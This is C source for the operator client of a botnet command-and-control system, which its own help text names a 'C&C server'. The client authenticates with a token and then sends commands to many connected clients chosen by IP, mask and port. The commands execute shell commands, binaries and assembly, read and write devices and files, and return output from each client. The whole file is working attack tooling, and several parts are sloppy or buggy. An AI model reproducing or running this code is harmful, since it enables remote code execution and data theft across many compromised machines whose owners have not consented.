#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <errno.h>
#include "protocol.h"
#include "options.h"


	int main(int argc, char *argv[]) {
	    // Connection variables
	    char server_ip[16] = DEFAULT_SERVER_IP;
	    uint16_t server_port = DEFAULT_SERVER_PORT;
	    char server_token[1022] = DEFAULT_SERVER_TOKEN;
	    bool client_timeout = DEFAULT_CLIENT_TIMEOUT;

	    // Variables to store IP address, port, output flag, command, and data
	    struct in_addr ip_;
	    ip_.s_addr = INADDR_ANY;
	    uint32_t ip = ntohl(ip_.s_addr);

	    struct in_addr mask_;
	    mask_.s_addr = INADDR_ANY;
	    uint32_t mask = ntohl(mask_.s_addr);

	    uint16_t port = 0;
	    bool output = true;
	    char command =  0; // Command will be at most 8 characters long, plus 1 for null terminator
	    char *data = NULL;
		    //bool reading_from_stdin = false;


	    // // Check if the command is provided
	    // if (argc < 3) {
	    //     printf("Usage: %s -c <command> [-a <data> | -a <stdin>] [-i <ip>] [-p <port>] [-q] [-h]\n", argv[0]);
	    //     return 1;
	    // }

	    // Parse command line data
	    for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--ip") == 0) {
		    // Convert IP address string to binary form
		    if (inet_pton(AF_INET, argv[i + 1], &ip_) != 1) {
			printf("Invalid IP address\n");
			return 1;
		    }
		    ip = ntohl(ip_.s_addr);
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--mask") == 0) {
		    // Convert IP address string to binary form
		    if (inet_pton(AF_INET, argv[i + 1], &mask_) != 1) {
			printf("Invalid mask\n");
			return 1;
		    }
		    mask = ntohl(mask_.s_addr);
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) {
		    // Convert port string to integer
		    port = atoi(argv[i + 1]);
		    if (port == 0) {
			printf("Invalid port number\n");
			return 1;
		    }
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-q") == 0 || strcmp(argv[i], "--quiet") == 0) {
		    output = false;
		} else if (strcmp(argv[i], "-w") == 0 || strcmp(argv[i], "--client-count-wait") == 0) {
		    client_timeout = atoi(argv[i + 1]);
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--data") == 0) {
		    if (i + 1 < argc && strlen(argv[i + 1]) > 0) {
			argv[i + 1][strlen(argv[i + 1])] = '\0';
			data = calloc(strlen(argv[i + 1])+BUFFER_SIZE, sizeof(char)); // TODO: cutrada enorme per arreglar el bug
			strcpy(data, argv[i + 1]);
		    } else {
			//reading_from_stdin = true;
		    }

		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--command") == 0) {
		    memcpy(&command, (char []){get_protocol_command(argv[i + 1])}, 1);
		    if (command == 0){
			printf("Invalid command\n");
			printf("EXECCMD (0x30): Execute Command - Run a command\n");
			printf("EXECBIN (0x31): Execute Binary - Run binary code\n");
			printf("EXECASM (0x32): Execute Assembly - Run assembly\n");
			printf("DEVREAD (0x33): Device Read - Read from a device\n");
			printf("DEVWRITE (0x34): Device Write - Write to a device\n");
			printf("DEVSHOW (0x35): Device Show - Show devices\n");
			printf("FILEREAD (0x36): File Read - Read from a file\n");
			printf("FILEWRITE (0x37): File Write - Write to a file\n");
			return 1;
		    }
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-I") == 0 || strcmp(argv[i], "--server-ip") == 0) {
		    strncpy(server_ip, argv[i + 1], sizeof(server_ip)-1);
		    server_ip[sizeof(server_ip)-1] = '\0';
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-P") == 0 || strcmp(argv[i], "--server-port") == 0) {
		    // Convert port string to integer
		    server_port = atoi(argv[i + 1]);
		    if (server_port == 0) {
			printf("Invalid server port number\n");
			return 1;
		    }
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-T") == 0 || strcmp(argv[i], "--server-token") == 0) {
		    strncpy(server_token, argv[i + 1], sizeof(server_token)-1);
		    server_token[sizeof(server_token)-1] = '\0';
		    i++; // Move to next argument
		} else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
		    printf("Usage: %s [OPTIONS]\n", argv[0]);
		    printf("Options:\n");
		    printf("  -c, --command <command>   Specify the command to execute.\n");
		    printf("  -a, --data <args>    Specify data or provide input via stdin.\n");
		    printf("  -i, --ip <ip>             Specify the IP address.\n");
		    printf("  -m, --mask <mask>         Specify the mask for the IP address.\n");
		    printf("  -p, --port <port>         Specify the port number.\n");
		    printf("  -q, --quiet               Suppress output messages.\n");

		    printf("  -w, --count-wait          Timeout in secconds that will wait in client count (default %i)\n", DEFAULT_CLIENT_TIMEOUT);
            printf("  -I, --server-ip           Ip of the C&C server (default %s).\n", DEFAULT_SERVER_IP);
            printf("  -P, --server-port         Port of the C&C server (default %i).\n", DEFAULT_SERVER_PORT);
            printf("  -T, --server-token        Token to autenticate in the server (default %s).\n", DEFAULT_SERVER_TOKEN);
            printf("  -h, --help                Show this help message and exit.\n");

            return 0;
        }
    }

    // Output the IP address, port, command, and data if output flag is true

        



    if (command == 0) {
        printf("Usage: %s -c <command> [-d <data> | -d <stdin>] [-i <ip>] [-p <port>] [-q] [-h]\n", argv[0]);
        return 1;
    } else {
        // printf("Connection info:\n");
        // printf("\tServer IP: %s\n", server_ip);
        // printf("\tServer port: %i\n", server_port);
        // printf("\tServer token: %s\n", server_token);


        // // char ip_str[INET_ADDRSTRLEN];
        // // inet_ntop(AF_INET, &ip, ip_str, INET_ADDRSTRLEN);
        // printf("Ip: %x\n", ip);
        // printf("Massk: %x\n", mask);
        // printf("Port: %d\n", port);

        // printf("Command: 0x%x\n", command);
        // printf("data: %s\n", data);
        // printf("Output: %i\n", output);



        int socket_desc;
        struct sockaddr_in server;
        char buffer[BUFFER_SIZE];
        int receive_count;
        
        // Create socket
        socket_desc = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_desc == -1) {
            printf("Could not create socket");
            return 1;
        }

        server.sin_addr.s_addr = inet_addr(server_ip);
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);

        // Connect to remote server
        if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
            perror("Connect failed. Error");
            return 1;
        }
        
        // printf("Connected to server\n");

        memset(&buffer, 0, sizeof(buffer));
        // Send login request
        memcpy(&buffer[0], (char []){COMMAND_LOGIN}, 1);
        memcpy(&buffer[1], server_token, strlen(server_token));
        send(socket_desc, buffer, BUFFER_SIZE, 0);
        

        // printf("d\n");
        if (recv(socket_desc, buffer, 1, 0) == 1){
            if (buffer[0] == (char)STATUS_CORRECTPASS){
                // printf("Correct token\n");
            } else {
                printf("Incorrect token\n");
                return 1;
            }

        }

    
        // --- send RUN_CMD_ADMIN request ---
        memset(&buffer, 0, sizeof(buffer));
        encapsulate_run_cmd_admin(buffer, command, ip, mask, port, output, (uint64_t)strlen(data)+1);
        // printf("ip: %d mask: %d port: %d output: %d bytes_left: %d\n", ip, mask, port, output, (uint64_t)strlen(data)+1);

        // for (int i = 0; i < 18; i++){
        //     if (i == 0 || i == 1 || i == 5 || i == 9 || i == 11 || i == 12  || i == 20){
        //         printf("-");
        //     }
        //     printf("%x", buffer[i]);
        // }
        printf("\n");

        send(socket_desc, buffer, BUFFER_SIZE, 0);


        // --- receive TRANSFER_CMD from server ---
        recv(socket_desc, buffer, 5, 0);
        
        if (buffer[0] == (char)ERROR_INVALIDPARAMETERS) {
            printf("Server message: ERROR_INVALIDPARAMETERS\n");
            return 1;
        } else if (buffer[0] != (char)COMMAND_SETDATASTREAMID) {
            return 2;
        }
        uint32_t data_stream_id = get_data_stream_id(buffer);
        // printf("data_stream_id -> %i\n", data_stream_id);

        // --- send TRANSFER_CMD to server ---
        // encapsulate_transfer_cmd(buffer, STATUS_RECEIVEDDATASTREAMID, data_stream_id);
        // send(socket_desc, buffer, 5, 0);

        // --- receive TRANSFER_CMD response of all clients ---
        int client_count;
        time_t start_time, current_time;
        

        // Set timeout option
        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 10; // 100 microseconds
        if (setsockopt(socket_desc, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
            // printf("Error setting socket option: %s\n", strerror(errno));
            return 1;
        }

        int elapsed_time = 0;
        client_count = 0;
        start_time = time(NULL);
        while (elapsed_time < client_timeout) {
            buffer[0] = '\0';
            if (recv(socket_desc, buffer, 5, 0) == 5 && buffer[0] == COMMAND_STARTRECEIVINGFROMCLIENT){
                client_count++;
            }
            current_time = time(NULL);
            elapsed_time = difftime(current_time, start_time);
            // printf("\n%i\n",elapsed_time);
        }
        printf("[*] Total clients: %i\n", client_count);
    
        // Set timeout option
        timeout.tv_sec = 5;
        timeout.tv_usec = 0; // 100 microseconds
        if (setsockopt(socket_desc, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
            printf("Error setting socket option: %s\n", strerror(errno));
            return 1;
        }

        // printf("data_size: %i | buffer size: %i\n", strlen(data)+1, (BUFFER_SIZE-5));
        for (int i = 0; i <= ((int)(strlen(data)+1)/(BUFFER_SIZE-5)); i++) {
            memset(&buffer, 0, BUFFER_SIZE);
            // printf("\t i -> %i\n", i);
            encapsulate_transfer_data_cmd(buffer, COMMAND_SENDINGFROMADMIN, data_stream_id, data, i*(BUFFER_SIZE-5));
            send(socket_desc, buffer, BUFFER_SIZE, 0); // SEND COMMAND_SENDINGFROMADMIN + data

            // decapsulate_transfer_data_cmd(buffer, &data_stream_id, data, i*(BUFFER_SIZE-5));
            // printf("data: %s", data);
            
            // printf("b\n");
            for (int j = 0; j < client_count; j++){
                // printf("\t\t [+] receving from clients (%i/%i)\n", j+1, client_count);
                recv(socket_desc, buffer, BUFFER_SIZE, 0);
                if (buffer[0] != (char)COMMAND_RECEIVINGFROMCLIENT) {
                    printf("Server error\n");
                    return 1;
                }
            }
        }
        // printf("b\n");
        // --- send TRANSFER_CMD to client ---
        encapsulate_transfer_cmd(buffer, STATUS_FROMADMINSENDED, data_stream_id);
        send(socket_desc, buffer, BUFFER_SIZE, 0);
        // printf("c\n");


        if (output) {
            // printf("d\n");
            
            receive_count = 0;
            while (receive_count < client_count){
                memset(data, 0, sizeof(&data));
                memset(buffer, 0, BUFFER_SIZE);
                // printf("f\n");
                recv(socket_desc, buffer, BUFFER_SIZE, 0);
                
                if (buffer[0] == (char)COMMAND_SENDINGFROMCLIENT){
                    decapsulate_transfer_data_cmd(buffer, &data_stream_id, data);
                    // printf("data: %s\n", data);
                    data[BUFFER_SIZE-5] = '\0';
                    // printf("buffer in HEX: %x", buffer);
                    
                    if (receive_count == 0 && data[0] == (char)STATUS_NOOUTPUT && strlen(data) == 1) {
                        printf("%i:\n%s\n", data_stream_id, 
                                (command == COMMAND_EXECCMD) ? "[no output]" :
                                (command == COMMAND_FILEREAD) ? "[empty file]" :
                                "STATUS_NOOUTPUT");

                    } else if (receive_count == 0 && data[0] == (char)STATUS_NOTFOUND && strlen(data) == 1) {
                        printf("%i:\n%s\n", data_stream_id, 
                            (command == COMMAND_EXECCMD) ? "[command not found]" :
                            (command == COMMAND_FILEREAD) ? "[file not found]" :
                            "STATUS_NOTFOUND");
                    } else {
                        printf("%i:\n%s\n", data_stream_id, data);
                    }

                    
                } else if (buffer[0] == (char)STATUS_FROMCLIENTSENDED) {
                    // printf("STATUS_FROMCLIENTSENDED received\n");
                    // printf("data: %s\n", data);
                    // printf("buffer: %s\n", buffer);
                    receive_count++;
                } else {
                    // printf("Server error\n");
                    // printf("buffer in HEX: %x", buffer);
                    return 1;
                }
            }
        }

        // printf("data: %s", data);







        // decapsulate_data(buffer, &command, &ip, &port, &output, *data);
        // Send server request
        // buffer[0] = ; server_token

        // printf("end\n");

        // if (recv(socket_desc, buffer, strlen(buffer), 0) < 0) {
        //     printf("Recv failed");
        //     return 1;
        // }

        // close(socket_desc);      
    }


    return 0;
}
